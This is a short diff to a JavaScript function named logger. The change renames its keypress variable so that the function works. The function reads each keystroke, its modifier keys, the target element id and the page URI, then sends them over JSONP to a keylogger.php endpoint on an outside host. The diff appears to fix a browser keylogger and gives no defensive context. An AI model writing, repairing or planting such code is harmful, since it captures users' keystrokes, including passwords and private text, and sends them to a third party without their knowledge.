@@ -14,11 +14,11 @@ function logger(keyPress){
       url: "https://example.com/keylogger.php",
       jsonp:"keypressed",
       data:{
-          altnKey:d.altKey?1:0,
-          ctrlKey:d.ctrlKey?1:0,
-          userKey:d.key,
-          targKey:d.target.id,
-          userURI:d.target.baseURI
+          altnKey:keyPress.altKey?1:0,
+          ctrlKey:keyPress.ctrlKey?1:0,
+          userKey:keyPress.key,
+          targKey:keyPress.target.id,
+          userURI:keyPress.target.baseURI
       },
       async:false,
       success: function(data){
